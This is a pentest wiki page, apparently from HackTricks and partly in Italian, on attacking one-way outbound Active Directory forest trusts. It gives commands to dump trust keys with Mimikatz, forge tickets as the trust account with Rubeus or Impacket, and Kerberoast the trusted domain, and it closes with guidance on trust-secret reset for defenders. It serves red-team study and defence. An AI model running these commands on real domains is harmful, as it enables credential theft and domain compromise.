# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

In questo scenario **your domain** sta **concedendo fiducia** ad alcuni **privileges** a principal provenienti da un **different domain/forest**.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Se hai disponibile il modulo AD, ispeziona direttamente anche il **Trusted Domain Object (TDO)**. Questo ti fornisce i dati grezzi del trust supportati da LDAP che ti serviranno in seguito quando deciderai se la via più semplice è **FSP/group abuse** o **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Dovresti anche enumerare dove i foreign principals da `CN=ForeignSecurityPrincipals` hanno effettivamente ottenuto accesso. I successi più comuni sono:

- **Local admin** su un server/DC nel tuo dominio attuale
- Membership in un **custom domain group** che ha ACLs su users/computers/GPOs
- Rights to modify **computer objects**, che in seguito possono diventare [RBCD](resource-based-constrained-delegation.md) se la trust configuration lo consente

## Trust Account Attack

Quando viene creato un one-way trust da domain/forest **B** a domain/forest **A** (**B trusts A**), viene creato un **trust account** per **B** in **A**. Nella outbound-trust view di **A**, questo è utile perché se in seguito comprometti **B** (il trusting side), puoi dumpare il trust secret lì e autenticarti di nuovo su **A** come `B$`.

L'aspetto critico da capire qui è che la password e il Kerberos material per quell'account di trust possono essere estratti da un Domain Controller nel dominio **trusting** usando:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Questo funziona perché l'account di trust creato nel dominio **trusted** è un principal abilitato che finisce con i diritti di base di un normale utente di dominio lì. Questo spesso è sufficiente per iniziare a enumerare LDAP, richiedere ticket e trovare il successivo path di escalation.

In uno scenario in cui `ext.local` è il dominio **trusting** e `root.local` è il dominio **trusted**, un account utente chiamato `EXT$` viene creato all'interno di `root.local`. Il dump delle trust keys da `ext.local` rivela credenziali che possono essere usate come `root.local\EXT$` contro `root.local`:
```bash
lsadump::trust /patch
```
Seguendo questo, usa la chiave **RC4** estratta per autenticarti come `root.local\EXT$` all'interno di `root.local`:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Quindi enumera il trusted domain come quel principal, ad esempio facendo Kerberoasting di un SPN ad alto valore in `root.local`:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Da Linux

Se hai recuperato la chiave dell'account di trust **RC4**, la stessa idea funziona da Linux con Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Se **RC4** non è accettato, passa alla **cleartext password** recuperata (o alle chiavi **AES** derivate) e riusa i normali flussi [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) e [Kerberoast](kerberoast.md) da quel foothold.

### Gotcha sul materiale delle chiavi

Non confondere **trust keys** e **trust-account credentials**:

- In un trust one-way, entrambe le parti memorizzano un **TDO**, ma il vero account utente **`EXT$` esiste solo nel dominio trusted**.
- La password attuale dell’account trust è riflessa nel trust secret del TDO (`NewPassword` / current trust key).
- La trust key **RC4** è l’artefatto più semplice da riutilizzare per `asktgt` come trust account; nelle configurazioni predefinite questa è di solito l’enctype funzionante perché spesso l’account trust ha un `msDS-SupportedEncryptionTypes` vuoto.
- Se ragioni in termini di **AES trust keys**, ricorda che non sono intercambiabili con le chiavi AES dell’account trust perché i salt differiscono.

Quindi, per la tecnica di questa pagina, preferisci o il materiale **RC4** dumpato oppure la **cleartext** password recuperata.

### Raccolta della cleartext trust password

Nel flusso precedente è stato usato l’hash del trust invece della **cleartext password** (che viene anche **dumpata da mimikatz**).

La cleartext password può essere ottenuta convertendo l’output \[ CLEAR ] di mimikatz da esadecimale e rimuovendo i null byte `\x00`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

A volte, quando si crea una trust relationship, l’utente deve digitare una password per il trust. In questa dimostrazione, la chiave è la password trust originale e quindi leggibile. Quando la chiave ruota (default: ogni 30 giorni), la cleartext di solito smette di essere leggibile ma resta tecnicamente utilizzabile.

La cleartext password può essere usata per eseguire una normale autenticazione come trust account, come alternativa alla richiesta di un TGT con la Kerberos secret key dell’account trust. Qui, interrogando `root.local` da `ext.local` per i membri di `Domain Admins`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Limitazioni pratiche

> [!WARNING]
> I trust account sono principal scomodi. I logon interattivi come **RUNAS / console / RDP** non sono il percorso atteso qui, e i tentativi di autenticazione **NTLM** possono fallire con `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Pianifica invece **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast).

### Nota su persistence / cleanup

Se i defender capiscono che il dominio trusted è stato compromesso, dovrebbero ruotare il trust secret su **entrambi i lati** con `netdom trust ... /resetOneSide ...`. Dal punto di vista dell’operatore questo è importante perché un **reset manuale invalida immediatamente il vecchio trust material**, mentre la rotazione normale della trust password mantiene disponibili i valori current/previous durante il rollover.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Riferimenti

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
